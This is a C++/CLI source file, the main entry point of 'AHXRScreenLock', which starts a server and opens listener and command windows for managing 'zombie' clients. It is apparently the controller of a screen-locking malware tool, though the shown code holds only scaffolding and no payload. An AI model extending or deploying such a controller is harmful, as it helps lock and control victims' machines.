/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include <msclr\marshal_cppstd.h>
#include <iostream>
#include <Windows.h>
#include <string>

using namespace msclr::interop;
using namespace System;
using namespace System::Windows::Forms;

int i_zombie_update = 0;
int i_selected_idx;
bool b_unlock_dialog;

void showCommandGUI();
DWORD WINAPI t_showCommandGUI(LPVOID lpParameter);

#include "clientTest.h"
#include "zombie.h"
#include "frmMain.h"
#include "frmCommand.h"
#include "serverThread.h"
#include "onServer.h"

[STAThread]
int main() {
	if (!startServer()) {
		perror(SERVER_ERROR_1);
		exit(0);
	}

#ifdef CLIENT_SERVER_TEST
	Sleep(1000);
	if (isServerAccepting())
		clientServerTest();
	else
		puts(SERVER_ERROR_2);
#endif

	Application::EnableVisualStyles();
	Application::SetCompatibleTextRenderingDefault(false);
	AHXRListener::frmMain frm;
	Application::Run(%frm);
}

void showCommandGUI() {
	h_command = CreateThread(0, 0, t_showCommandGUI, 0, 0, &dw_command);
}

DWORD WINAPI t_showCommandGUI(LPVOID lpParameter) {
	b_unlock_dialog = true;
	AHXRListener::frmCommand frm;
	Application::Run(%frm);
	return 0;
}